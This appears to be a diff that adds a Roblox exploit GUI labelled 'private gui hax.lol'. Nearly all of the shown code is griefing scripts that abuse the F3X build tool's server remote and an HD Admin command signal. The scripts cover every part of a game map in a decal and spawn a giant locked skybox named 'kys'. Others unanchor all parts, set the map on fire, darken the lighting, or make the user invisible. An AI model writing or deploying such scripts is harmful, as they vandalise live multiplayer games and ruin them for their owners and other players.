+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.spawn(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			task.spawn(function() send({"SyncCollision", {{Part = part, CanCollide = bool}}}) end)
+		end
+	
+		local function setAnchor(bool, part)
+			task.spawn(function() send({"SyncAnchor", {{Part = part, Anchored = bool}}}) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send({"CreatePart", "Normal", cf, parent}) end)
+		end
+	
+		local function killPart(part)
+			task.spawn(function() send({"Remove", {part}}) end)
+		end
+	
+		local function movePart(part, cf)
+			task.spawn(function() send({"SyncMove", {{Part = part, CFrame = cf}}}) end)
+		end
+	
+		local function resizePart(part, sz, cf)
+			task.spawn(function() send({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}}) end)
+		end
+	
+		local function addMeshToPart(part)
+			task.spawn(function() send({"CreateMeshes", {{Part = part}}}) end)
+		end
+	
+		local function changeMesh(part, meshId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}}) end)
+		end
+	
+		local function changeTexture(part, texId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}}) end)
+		end
+	
+		local function renamePart(part, newName)
+			task.spawn(function() send({"SetName", {part}, newName}) end)
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			task.spawn(function() send({"SyncMesh", {{Part = part, Scale = scaleVal}}}) end)
+		end
+	
+		local function weldParts(partA, partB, leader)
+			task.spawn(function() send({"CreateWelds", {partA, partB}, leader}) end)
+		end
+	
+		local function lockPart(part, bool)
+			task.spawn(function() send({"SetLocked", {part}, bool}) end)
+		end
+	
+		local function setTransparency(part, val)
+			task.spawn(function() send({"SyncMaterial", {{Part = part, Transparency = val}}}) end)
+		end
+	
+		local function addSpotlight(part)
+			task.spawn(function() send({"CreateLights", {{Part = part, LightType = "SpotLight"}}}) end)
+		end
+	
+		local function setLightBrightness(part, brightness)
+			task.spawn(function() send({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}}) end)
+		end
+	
+		local function recolorPart(part, colorVal)
+			task.spawn(function() send({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}}) end)
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			task.spawn(function() send({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}}) end)
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			task.spawn(function() send({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}}) end)
+		end
+	
+		for i = 1, #allParts do
+			task.spawn(setTransparency, allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_4f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_51()
+local script = G2L["51"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalID = "10560525674" -- put ur decal idfk
+		local rs = game:GetService("ReplicatedStorage")
+		local cmd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		cmd:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local plrs = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local me = plrs.LocalPlayer
+	
+		local function findTool()
+			local char = me.Character or me.CharacterAdded:Wait()
+			for _, obj in char:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+			for _, obj in me.Backpack:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function fire(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local old = ws:FindFirstChild("kys")
+		if old then
+			fire("Remove", { old })
+		end
+	
+		local function backupFind()
+			for _, obj in me:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in rs:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+		end
+	
+		tool = tool or backupFind()
+		if not tool then return end
+	
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local partsList = {}
+		for _, part in ws:GetDescendants() do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" then
+				partsList[#partsList + 1] = part
+			end
+		end
+	
+		local sides = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local sideIds = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, side in pairs(sides) do
+			task.spawn(function()
+				local id = sideIds[side]
+				local batch1 = {}
+				local batch2 = {}
+				for i = 1, #partsList do
+					local p = partsList[i]
+					batch1[i] = {Part = p, Face = id, TextureType = "Decal"}
+					batch2[i] = {Part = p, Face = id, TextureType = "Decal", Texture = "rbxassetid://" .. decalID}
+				end
+				fire('CreateTextures', batch1)
+				fire('SyncTexture', batch2)
+			end)
+		end
+	
+		local char = me.Character or me.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local pos = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = fire("CreatePart", "Normal", pos, ws)
+	
+		task.spawn(function() fire("SyncAnchor", { { Part = sky, Anchored = true } }) end)
+		task.spawn(function() fire("SyncCollision", { { Part = sky, CanCollide = false } }) end)
+		task.spawn(function() fire("CreateMeshes", { { Part = sky } }) end)
+		task.spawn(function()
+			fire("SyncMesh", {{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. decalID,
+				Scale = Vector3.new(100999, 100999, 100999),
+				VertexColor = Vector3.new(4.5, 4.5, 4.5)
+			}})
+		end)
+		task.spawn(function() fire("SetLocked", { sky }, true) end)
+		task.spawn(function() fire("SetName", { sky }, "kys") end)
+		task.spawn(function() fire("SyncMaterial", { { Part = sky, Transparency = 0 } }) end)
+		task.spawn(function() fire("SyncMove", { { Part = sky, CFrame = pos } }) end)
+	
+		local function send(...)
+			return fire(...)
+		end
+	
+		local function col(part, bool)
+			task.spawn(function() send("SyncCollision", { { Part = part, CanCollide = bool } }) end)
+		end
+	
+		local function anch(part, bool)
+			task.spawn(function() send("SyncAnchor", { { Part = part, Anchored = bool } }) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send("CreatePart", "Normal", cf, parent) end)
+		end
+	
+		local function kill(part)
+			task.spawn(function() send("Remove", { part }) end)
+		end
+	
+		local function move(part, cf)
+			task.spawn(function() send("SyncMove", { { Part = part, CFrame = cf } }) end)
+		end
+	
+		local function resize(part, sz, cf)
+			task.spawn(function() send("SyncResize", { { Part = part, CFrame = cf, Size = sz } }) end)
+		end
+	
+		local function addMeshTo(part)
+			task.spawn(function() send("CreateMeshes", { { Part = part } }) end)
+		end
+	
+		local function setMesh(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function setTex(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function rename(part, name)
+			task.spawn(function() send("SetName", { part }, name) end)
+		end
+	
+		local function scaleMesh(part, val)
+			task.spawn(function() send("SyncMesh", { { Part = part, Scale = val } }) end)
+		end
+	
+		local function weld(a, b, leader)
+			task.spawn(function() send("CreateWelds", { a, b }, leader) end)
+		end
+	
+		local function lock(part, bool)
+			task.spawn(function() send("SetLocked", { part }, bool) end)
+		end
+	
+		local function alpha(part, val)
+			task.spawn(function() send("SyncMaterial", { { Part = part, Transparency = val } }) end)
+		end
+	
+		local function light(part)
+			task.spawn(function() send("CreateLights", { { Part = part, LightType = "SpotLight" } }) end)
+		end
+	
+		local function brightness(part, val)
+			task.spawn(function() send("SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = val } }) end)
+		end
+	
+		local function color(part, val)
+			task.spawn(function() send("SyncColor", { { Part = part, Color = val, UnionColoring = false } }) end)
+		end
+	
+		local function addDecalTo(part, side)
+			task.spawn(function() send("CreateTextures", { { Part = part, Face = side, TextureType = "Decal" } }) end)
+		end
+	
+		local function setDecal(part, id, side)
+			task.spawn(function() send("SyncTexture", { { Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. id } }) end)
+		end
+	
+		for _, part in pairs(partsList) do
+			task.spawn(alpha, part, 0)
+		end
+	end)
+end;
+task.spawn(C_51);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_53()
+local script = G2L["53"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalID = "71846876988770" -- put ur decal idfk
+		local rs = game:GetService("ReplicatedStorage")
+		local cmd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		cmd:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local plrs = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local me = plrs.LocalPlayer
+	
+		local function findTool()
+			local char = me.Character or me.CharacterAdded:Wait()
+			for _, obj in char:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+			for _, obj in me.Backpack:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function fire(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local old = ws:FindFirstChild("kys")
+		if old then
+			fire("Remove", { old })
+		end
+	
+		local function backupFind()
+			for _, obj in me:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in rs:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+		end
+	
+		tool = tool or backupFind()
+		if not tool then return end
+	
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local partsList = {}
+		for _, part in ws:GetDescendants() do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" then
+				partsList[#partsList + 1] = part
+			end
+		end
+	
+		local sides = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local sideIds = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, side in pairs(sides) do
+			task.spawn(function()
+				local id = sideIds[side]
+				local batch1 = {}
+				local batch2 = {}
+				for i = 1, #partsList do
+					local p = partsList[i]
+					batch1[i] = {Part = p, Face = id, TextureType = "Decal"}
+					batch2[i] = {Part = p, Face = id, TextureType = "Decal", Texture = "rbxassetid://" .. decalID}
+				end
+				fire('CreateTextures', batch1)
+				fire('SyncTexture', batch2)
+			end)
+		end
+	
+		local char = me.Character or me.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local pos = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = fire("CreatePart", "Normal", pos, ws)
+	
+		task.spawn(function() fire("SyncAnchor", { { Part = sky, Anchored = true } }) end)
+		task.spawn(function() fire("SyncCollision", { { Part = sky, CanCollide = false } }) end)
+		task.spawn(function() fire("CreateMeshes", { { Part = sky } }) end)
+		task.spawn(function()
+			fire("SyncMesh", {{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. decalID,
+				Scale = Vector3.new(100999, 100999, 100999),
+				VertexColor = Vector3.new(4.5, 4.5, 4.5)
+			}})
+		end)
+		task.spawn(function() fire("SetLocked", { sky }, true) end)
+		task.spawn(function() fire("SetName", { sky }, "kys") end)
+		task.spawn(function() fire("SyncMaterial", { { Part = sky, Transparency = 0 } }) end)
+		task.spawn(function() fire("SyncMove", { { Part = sky, CFrame = pos } }) end)
+	
+		local function send(...)
+			return fire(...)
+		end
+	
+		local function col(part, bool)
+			task.spawn(function() send("SyncCollision", { { Part = part, CanCollide = bool } }) end)
+		end
+	
+		local function anch(part, bool)
+			task.spawn(function() send("SyncAnchor", { { Part = part, Anchored = bool } }) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send("CreatePart", "Normal", cf, parent) end)
+		end
+	
+		local function kill(part)
+			task.spawn(function() send("Remove", { part }) end)
+		end
+	
+		local function move(part, cf)
+			task.spawn(function() send("SyncMove", { { Part = part, CFrame = cf } }) end)
+		end
+	
+		local function resize(part, sz, cf)
+			task.spawn(function() send("SyncResize", { { Part = part, CFrame = cf, Size = sz } }) end)
+		end
+	
+		local function addMeshTo(part)
+			task.spawn(function() send("CreateMeshes", { { Part = part } }) end)
+		end
+	
+		local function setMesh(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function setTex(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function rename(part, name)
+			task.spawn(function() send("SetName", { part }, name) end)
+		end
+	
+		local function scaleMesh(part, val)
+			task.spawn(function() send("SyncMesh", { { Part = part, Scale = val } }) end)
+		end
+	
+		local function weld(a, b, leader)
+			task.spawn(function() send("CreateWelds", { a, b }, leader) end)
+		end
+	
+		local function lock(part, bool)
+			task.spawn(function() send("SetLocked", { part }, bool) end)
+		end
+	
+		local function alpha(part, val)
+			task.spawn(function() send("SyncMaterial", { { Part = part, Transparency = val } }) end)
+		end
+	
+		local function light(part)
+			task.spawn(function() send("CreateLights", { { Part = part, LightType = "SpotLight" } }) end)
+		end
+	
+		local function brightness(part, val)
+			task.spawn(function() send("SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = val } }) end)
+		end
+	
+		local function color(part, val)
+			task.spawn(function() send("SyncColor", { { Part = part, Color = val, UnionColoring = false } }) end)
+		end
+	
+		local function addDecalTo(part, side)
+			task.spawn(function() send("CreateTextures", { { Part = part, Face = side, TextureType = "Decal" } }) end)
+		end
+	
+		local function setDecal(part, id, side)
+			task.spawn(function() send("SyncTexture", { { Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. id } }) end)
+		end
+	
+		for _, part in pairs(partsList) do
+			task.spawn(alpha, part, 0)
+		end
+	end)
+end;
+task.spawn(C_53);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_55()
+local script = G2L["55"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local r = tool.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		local char = player.Character
+		if char then
+			for _, part in pairs(char:GetDescendants()) do
+				if part:IsA("BasePart") then
+					task.spawn(function()
+						call("SyncMaterial", { { Part = part, Transparency = 1 } })
+					end)
+				end
+			end
+		end
+	end)
+end;
+task.spawn(C_55);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_57()
+local script = G2L["57"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local r = tool.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		local char = player.Character
+		if char then
+			for _, part in pairs(char:GetDescendants()) do
+				if part:IsA("BasePart") then
+					task.spawn(function()
+						call("SyncMaterial", { { Part = part, Transparency = 0 } })
+					end)
+				end
+			end
+		end
+	end)
+end;
+task.spawn(C_57);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_59()
+local script = G2L["59"];
+	script.Parent.MouseButton1Click:Connect(function()
+		
+		
+		
+	end)
+end;
+task.spawn(C_59);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_5b()
+local script = G2L["5b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		-- i dont used the b2s sky function anymore, i used this instead
+		local hack = workspace:FindFirstChild("kys")
+		if hack then
+			call({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
+	
+		task.spawn(function()
+			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		end)
+	
+		task.spawn(function()
+			call({ "CreateMeshes", { { Part = sky } } })
+		end)
+	
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://118410101521277",
+					Scale = Vector3.new(100999, 100999, 100999),
+					VertexColor = Vector3.new(4,4,4)
+				}}
+			})
+		end)
+	
+		task.spawn(function()
+			call({ "SetLocked", { sky }, true })
+		end)
+	
+		task.spawn(function()
+			call({ "SetName", { sky }, "kys" })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
+		end)
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+	
+		-- get all info
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function setanchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function unanchorall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					spawn(function()
+						setanchor(v, false)
+					end)
+				end
+			end
+		end
+	
+		unanchorall()
+	end)
+end;
+task.spawn(C_5b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_5d()
+local script = G2L["5d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local fuckskid = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		fuckskid:InvokeServer(";time 0")
+	
+		local function getfuckedlol()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local blue2durhamhacks = getfuckedlol()
+		if not blue2durhamhacks then return end
+	
+		local r = blue2durhamhacks.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		local parts = {}
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" then
+				table.insert(parts, v)
+			end
+		end
+	
+		for _, v in pairs(parts) do
+			task.defer(function()
+				pcall(function() call("SyncColor", { { Part = v, Color = Color3.new(0, 0, 0), UnionColoring = false } }) end)
+				pcall(function() call("CreateLights", { { Part = v, LightType = "PointLight" } }) end)
+				pcall(function() call("SyncLighting", { { Part = v, LightType = "PointLight", Color = Color3.new(1, 0, 0), Range = 20, Brightness = 10 } }) end)
+				pcall(function() call("CreateDecorations", { { Part = v, DecorationType = "Fire" } }) end)
+				pcall(function() call("SyncDecorate", { { Part = v, DecorationType = "Fire", Size = 1000, Color = Color3.new(1, 0.5, 0), SecondaryColor = Color3.new(1, 0, 0) } }) end)
+			end)
+		end
+	end)
+end;
+task.spawn(C_5d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_5f()
+local script = G2L["5f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalID = "89618780972630" -- put ur decal idfk
+		local rs = game:GetService("ReplicatedStorage")
+		local cmd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		cmd:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local plrs = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local me = plrs.LocalPlayer
+	
+		local function findTool()
+			local char = me.Character or me.CharacterAdded:Wait()
+			for _, obj in char:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+			for _, obj in me.Backpack:GetChildren() do
+				if obj:IsA("Tool") and obj:FindFirstChild("SyncAPI") then
+					return obj
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function fire(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local old = ws:FindFirstChild("kys")
+		if old then
+			fire("Remove", { old })
+		end
+	
+		local function backupFind()
+			for _, obj in me:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in rs:GetDescendants() do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+		end
+	
+		tool = tool or backupFind()
+		if not tool then return end
+	
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local partsList = {}
+		for _, part in ws:GetDescendants() do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" then
+				partsList[#partsList + 1] = part
+			end
+		end
+	
+		local sides = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local sideIds = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, side in pairs(sides) do
+			task.spawn(function()
+				local id = sideIds[side]
+				local batch1 = {}
+				local batch2 = {}
+				for i = 1, #partsList do
+					local p = partsList[i]
+					batch1[i] = {Part = p, Face = id, TextureType = "Decal"}
+					batch2[i] = {Part = p, Face = id, TextureType = "Decal", Texture = "rbxassetid://" .. decalID}
+				end
+				fire('CreateTextures', batch1)
+				fire('SyncTexture', batch2)
+			end)
+		end
+	
+		local char = me.Character or me.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local pos = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = fire("CreatePart", "Normal", pos, ws)
+	
+		task.spawn(function() fire("SyncAnchor", { { Part = sky, Anchored = true } }) end)
+		task.spawn(function() fire("SyncCollision", { { Part = sky, CanCollide = false } }) end)
+		task.spawn(function() fire("CreateMeshes", { { Part = sky } }) end)
+		task.spawn(function()
+			fire("SyncMesh", {{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. decalID,
+				Scale = Vector3.new(100999, 100999, 100999),
+				VertexColor = Vector3.new(4.5, 4.5, 4.5)
+			}})
+		end)
+		task.spawn(function() fire("SetLocked", { sky }, true) end)
+		task.spawn(function() fire("SetName", { sky }, "kys") end)
+		task.spawn(function() fire("SyncMaterial", { { Part = sky, Transparency = 0 } }) end)
+		task.spawn(function() fire("SyncMove", { { Part = sky, CFrame = pos } }) end)
+	
+		local function send(...)
+			return fire(...)
+		end
+	
+		local function col(part, bool)
+			task.spawn(function() send("SyncCollision", { { Part = part, CanCollide = bool } }) end)
+		end
+	
+		local function anch(part, bool)
+			task.spawn(function() send("SyncAnchor", { { Part = part, Anchored = bool } }) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send("CreatePart", "Normal", cf, parent) end)
+		end
+	
+		local function kill(part)
+			task.spawn(function() send("Remove", { part }) end)
+		end
+	
+		local function move(part, cf)
+			task.spawn(function() send("SyncMove", { { Part = part, CFrame = cf } }) end)
+		end
+	
+		local function resize(part, sz, cf)
+			task.spawn(function() send("SyncResize", { { Part = part, CFrame = cf, Size = sz } }) end)
+		end
+	
+		local function addMeshTo(part)
+			task.spawn(function() send("CreateMeshes", { { Part = part } }) end)
+		end
+	
+		local function setMesh(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function setTex(part, id)
+			task.spawn(function() send("SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. id } }) end)
+		end
+	
+		local function rename(part, name)
+			task.spawn(function() send("SetName", { part }, name) end)
+		end
+	
+		local function scaleMesh(part, val)
+			task.spawn(function() send("SyncMesh", { { Part = part, Scale = val } }) end)
+		end
+	
+		local function weld(a, b, leader)
+			task.spawn(function() send("CreateWelds", { a, b }, leader) end)
+		end
+	
+		local function lock(part, bool)
+			task.spawn(function() send("SetLocked", { part }, bool) end)
+		end
+	
+		local function alpha(part, val)
+			task.spawn(function() send("SyncMaterial", { { Part = part, Transparency = val } }) end)
+		end
+	
+		local function light(part)
+			task.spawn(function() send("CreateLights", { { Part = part, LightType = "SpotLight" } }) end)
+		end
+	
+		local function brightness(part, val)
+			task.spawn(function() send("SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = val } }) end)
+		end
+	
+		local function color(part, val)
+			task.spawn(function() send("SyncColor", { { Part = part, Color = val, UnionColoring = false } }) end)
+		end
+	
+		local function addDecalTo(part, side)
+			task.spawn(function() send("CreateTextures", { { Part = part, Face = side, TextureType = "Decal" } }) end)
+		end
+	
+		local function setDecal(part, id, side)
+			task.spawn(function() send("SyncTexture", { { Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. id } }) end)
+		end
+	
+		for _, part in pairs(partsList) do
+			task.spawn(alpha, part, 0)
+		end
+	end)
+end;
+task.spawn(C_5f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_61()
+local script = G2L["61"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
